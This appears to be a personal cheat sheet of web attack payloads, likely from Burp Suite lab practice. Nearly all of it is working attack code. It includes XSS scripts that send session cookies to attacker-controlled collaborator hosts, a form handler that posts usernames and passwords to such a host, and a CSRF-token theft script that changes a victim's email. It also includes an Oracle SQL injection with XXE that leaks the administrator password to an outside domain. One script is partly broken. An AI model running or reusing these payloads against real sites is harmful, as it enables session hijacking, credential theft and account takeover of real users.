Steal session cookie:
```
<script>
    window.location.href="//pqjspu9zvmttutdp989ypk4nxe35ru.oastify.com/" + document.cookie 
</script>
```

Steal password on event:

```
<!-- This will pick id and password of a user  -->

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

CORS, getting details of an account:

Normal:
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Custom:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse();
req.open('get','http://127.0.0.1:8000/test.html',true);
req.send();
    function handleResponse() { console.log()
    var token = this.responseText.match(/unixtimestamp.[0-9]*/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.onload = handleResponse2();
    changeReq.open('get', '/'+token, true);
    changeReq.withCredentials = true;
    changeReq.send()
  function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };
  }
  </script>
```


Changing email intercepting the request and storing for next request the CRSF

```
<!-- reference for (/w+) https://stackoverflow.com/questions/14373310/regex-difference-w-and-w -->
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Steal data with SQLi and XXE
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.1pr4o68buys5t5c18k8aow3zwq2lqa.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
Dual table in oracle database its always present

this attack is a mix of XXE and SQL the || (concant is necessary to add SQL command, remember the ' ' )

```
<script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>
    ```
